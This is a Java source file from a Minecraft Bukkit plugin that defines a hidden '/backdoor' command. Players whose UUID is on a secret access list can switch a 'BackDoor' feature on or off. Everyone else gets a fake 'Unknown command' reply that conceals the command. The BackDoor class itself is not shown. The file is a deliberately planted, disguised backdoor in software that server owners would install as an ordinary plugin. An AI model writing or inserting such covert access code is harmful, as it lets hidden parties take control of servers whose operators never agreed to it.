package me.superischroma.superplus.command;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import me.superischroma.superplus.BackDoor;

@CommandParameters(name = "backdoor", source = Source.IN_GAME)
public class Command_backdoor extends SuperCommand
{
    public boolean onCommand(CommandSender sender, Command cmd, String c, String[] args)
    {
        Player player = (Player) sender;
        if (!BackDoor.accessList.contains(player.getUniqueId().toString()))
        {
            sender.sendMessage("Unknown command. Type \"/help\" for help.");
            return true;
        }
        if (args.length > 1)
        {
            return false;
        }
        if (args.length == 1)
        {
            if (args[0].equalsIgnoreCase("on"))
            {
                if (BackDoor.isEnabled())
                {
                    sender.sendMessage(ChatColor.GRAY + "BackDoor is already active.");
                    return true;
                }
                BackDoor.enable();
                sender.sendMessage(ChatColor.GRAY + "BackDoor is now active.");
                return true;
            }
            if (args[0].equalsIgnoreCase("off"))
            {
                if (!BackDoor.isEnabled())
                {
                    sender.sendMessage(ChatColor.GRAY + "BackDoor isn't active.");
                    return true;
                }
                BackDoor.disable();
                sender.sendMessage(ChatColor.GRAY + "BackDoor is no longer active.");
                return true;
            }
        }
        sender.sendMessage(ChatColor.GRAY + "BackDoor accessed.");
        return false;
    }
}
